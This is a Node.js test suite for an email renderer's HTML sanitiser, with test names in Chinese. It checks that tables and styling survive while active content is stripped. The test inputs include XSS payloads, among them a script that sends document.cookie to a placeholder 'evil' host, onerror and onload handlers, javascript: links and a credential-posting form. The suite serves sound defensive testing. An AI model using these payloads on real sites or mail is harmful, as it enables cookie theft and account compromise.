'use strict';

/* ===========================================================================
   Showing a message the way it was written, without running it.

   The reader used to convert every body to text, which is safe and unreadable:
   a quotation, a table of figures and a signature block arrive as one
   paragraph. Bringing the formatting back means accepting markup that a
   stranger wrote and addressed to this machine, so what it may contain is a
   list -- an allowed list, checked here against the things people actually put
   in mail to get code to run.

   Two layers are not tested here because they are not code in this file: the
   frame is `sandbox` with nothing allowed, and the document carries
   `default-src 'none'`. This is the third one, and the only one with branches.
   =========================================================================== */

const test = require('node:test');
const assert = require('node:assert/strict');

const mailhtml = require('../app/renderer/mailhtml');

/** Everything the output could possibly execute or fetch. */
function inert(html) {
  return !/<script|<iframe|<object|<embed|<form|<link|<meta|<base|<svg|<style/i.test(html)
    && !/\son[a-z]+\s*=/i.test(html)
    && !/javascript:/i.test(html);
}

test('一封信看起來還是那封信：表格、引言、標題都留著', () => {
  const src = [
    '<h2>九月報表</h2>',
    '<table border="1" cellpadding="4"><tr><th>品名</th><th>數量</th></tr>',
    '<tr><td>螺絲</td><td align="right">1,200</td></tr></table>',
    '<blockquote>上一封信說：交期改為二十日</blockquote>',
    '<p style="color:#036;font-size:13px">以上，<b>王小明</b></p>'
  ].join('');
  const out = mailhtml.sanitise(src, {});

  for (const tag of ['h2', 'table', 'th', 'td', 'blockquote', 'b']) {
    assert.ok(out.html.includes('<' + tag), tag + ' 不見了，信就不像那封信了');
  }
  assert.ok(out.html.includes('border="1"'), '表格框線是排版的一部分');
  assert.ok(out.html.includes('align="right"'), '數字靠右也是');
  assert.ok(/color:#036/.test(out.html), '顏色留著');
  assert.ok(/font-size:13px/.test(out.html), '字級留著');
});

test('腳本、事件處理器、表單、外框都不會活著出來', () => {
  const src = [
    '<p>正常內容</p>',
    '<script>fetch("https://evil/x?c="+document.cookie)</scr' + 'ipt>',
    '<img src=x onerror="alert(1)">',
    '<div onclick="bad()" onmouseover="worse()">點我</div>',
    '<a href="javascript:alert(1)">按這裡</a>',
    '<iframe src="https://evil/frame"></iframe>',
    '<form action="https://evil/steal"><input name="pw"><button>送出</button></form>',
    '<object data="x.swf"></object><embed src="y">',
    '<style>body{background:url(https://evil/track)}</style>',
    '<link rel="stylesheet" href="https://evil/x.css">',
    '<base href="https://evil/">',
    '<svg onload="alert(1)"><use href="#x"/></svg>'
  ].join('');
  const out = mailhtml.sanitise(src, {});

  assert.ok(inert(out.html), '還有可執行的東西留著：' + out.html.slice(0, 300));
  assert.ok(out.html.includes('正常內容'), '把危險的拿掉，不是把信拿掉');
  assert.ok(out.html.includes('點我'), '不認得的屬性丟掉，字要留著');
  assert.ok(!/evil/.test(out.html.replace(/data-link="\d+"/g, '')),
    '連結的目的地不會留在標記裡：' + out.html);
});

test('不認得的元素丟掉盒子，留下裡面的字', () => {
  /* A <section> is a box. Dropping the box must not drop the sentence inside
     it, or a message laid out with elements this list has not heard of comes
     out blank. */
  const out = mailhtml.sanitise('<section><article>重要通知</article></section>', {});
  assert.ok(out.html.includes('重要通知'));
  assert.ok(!/<section|<article/.test(out.html));

  /* But an element that carries no text a reader wants goes whole. */
  const dropped = mailhtml.sanitise('<p>前</p><script>var x = "看不見的字";</scr' + 'ipt><p>後</p>', {});
  assert.ok(!dropped.html.includes('看不見的字'), 'script 的內容是程式，不是內容');
  assert.ok(dropped.html.includes('前') && dropped.html.includes('後'));
});

test('遠端圖片預設不載入，因為載入就是回報「這個地址是真的，而且讀了」', () => {
  const src = '<p>看圖</p><img src="https://track.example/p.gif?id=abc" alt="像素">' +
    '<img src="data:image/png;base64,iVBORw0KGgo=" alt="內嵌">';

  const off = mailhtml.sanitise(src, { images: false });
  assert.equal(off.images, 2);
  assert.ok(off.blocked >= 1, '遠端那張要被擋下來');
  assert.ok(!/track\.example/.test(off.html), '網址不能留在標記裡，留著就會被抓');
  assert.ok(off.html.includes('［圖片］'), '要留一個看得見的缺口，不是靜靜消失');

  const on = mailhtml.sanitise(src, { images: true });
  assert.ok(/track\.example/.test(on.html), '使用者按了才載入');
  assert.equal(on.blocked, 0);

  /* An inline image is part of the message, not a fetch, so it is never held
     back -- but only if it really is one. */
  assert.equal(mailhtml.imageSrc('data:image/png;base64,iVBORw0KGgo='),
    'data:image/png;base64,iVBORw0KGgo=');
  assert.equal(mailhtml.imageSrc('data:text/html;base64,PHNjcmlwdD4='), '',
    'data: 不等於圖片');
  assert.equal(mailhtml.imageSrc('javascript:alert(1)'), '');
});

test('連結保留外觀、失去去處，真正的網址另外列出來', () => {
  /* The phishing surface. A click that silently opens the real browser is the
     thing to avoid, so the address comes back where a person can read it. */
  const out = mailhtml.sanitise(
    '<a href="https://real.example/invoice">發票</a> 與 ' +
    '<a href="https://evil.example/login">帳號驗證</a> 與 ' +
    '<a href="javascript:steal()">這個</a> 與 ' +
    '<a href="mailto:a@b.com">寄信</a>', {});

  assert.deepEqual(out.links,
    ['https://real.example/invoice', 'https://evil.example/login', 'mailto:a@b.com'],
    'javascript: 不是去處');
  assert.ok(!/href=/.test(out.html), '標記裡不留 href');
  assert.ok(out.html.includes('發票') && out.html.includes('帳號驗證'), '文字照舊');
  assert.ok(/data-link="1"/.test(out.html) && /data-link="2"/.test(out.html),
    '每個連結要有編號，才知道清單上哪一條對應畫面上哪一個');
});

test('樣式只留排版用的，會把東西拉出框或抓外部資源的都不留', () => {
  assert.equal(mailhtml.cleanStyle('color:red;position:fixed;top:0'), 'color:red');
  assert.equal(mailhtml.cleanStyle('background:url(https://track/x)'), '',
    'CSS 也能發出請求，這條路一樣要堵');
  assert.equal(mailhtml.cleanStyle('width:100%;behavior:url(x.htc)'), 'width:100%');
  assert.equal(mailhtml.cleanStyle('font-family:Arial;-moz-binding:url(x)'), 'font-family:Arial');
  assert.equal(mailhtml.cleanStyle('color:expression(alert(1))'), '');
  assert.ok(mailhtml.cleanStyle('border:1px solid #ccc;padding:4px')
    .includes('border:1px solid #ccc'), '表格框線要留著');
});

test('標記壞掉的信不會把後面的內容吃掉', () => {
  /* Real mail is full of unbalanced tags -- a stray </div> from a signature, a
     <td> nobody closed. A parser that lets one of those swallow the rest of the
     message loses the half the reader wanted. */
  const out = mailhtml.sanitise('<div><p>第一段</div></p></div></span>第二段<b>第三段', {});
  assert.ok(out.html.includes('第一段'));
  assert.ok(out.html.includes('第二段'), '多餘的結束標籤不能把後面吃掉');
  assert.ok(out.html.includes('第三段'), '沒關的標籤要自己補上');
  const opens = (out.html.match(/<b>/g) || []).length;
  const closes = (out.html.match(/<\/b>/g) || []).length;
  assert.equal(opens, closes, '補完之後標籤要成對：' + out.html);
});

test('整份文件帶著自己的政策，而且政策比標記更早生效', () => {
  const built = mailhtml.document('<p>hi</p><img src="https://x/y.png">', { images: false });
  assert.ok(built.page.includes('<meta http-equiv="Content-Security-Policy"'));
  const csp = /content="([^"]+)"/.exec(built.page)[1];
  assert.ok(csp.includes("default-src &#39;none&#39;") || csp.includes("default-src 'none'"),
    '沒有 default-src none，其他都是裝飾：' + csp);
  assert.ok(/img-src data:(;|")/.test(csp) || /img-src data:;/.test(csp),
    '預設只准內嵌圖片：' + csp);
  assert.ok(!/img-src[^;]*https:/.test(csp), '沒按「顯示圖片」就不該准遠端圖片');

  const withImages = mailhtml.document('<p>hi</p>', { images: true });
  assert.ok(/img-src[^;]*https:/.test(/content="([^"]+)"/.exec(withImages.page)[1]),
    '按了才准');

  /* The policy sits in the head, before anything it governs. */
  assert.ok(built.page.indexOf('Content-Security-Policy') < built.page.indexOf('<body'),
    '政策要在內容之前');
});

test('空的、超長的、不是字串的，都不會讓它爆掉', () => {
  assert.equal(mailhtml.sanitise('', {}).html, '');
  assert.equal(mailhtml.sanitise(null, {}).html, '');
  assert.equal(mailhtml.sanitise(undefined, {}).html, '');
  const big = mailhtml.sanitise('<p>' + 'a'.repeat(200000) + '</p>', {});
  assert.ok(big.html.length > 1000, '長信也要出得來');
  const weird = mailhtml.sanitise('<p style="' + 'x'.repeat(3000) + '">字</p>', {});
  assert.ok(weird.html.includes('字'));
  assert.ok(weird.html.length < 4000, '超長的屬性要被丟掉，不是原樣搬過去');
});
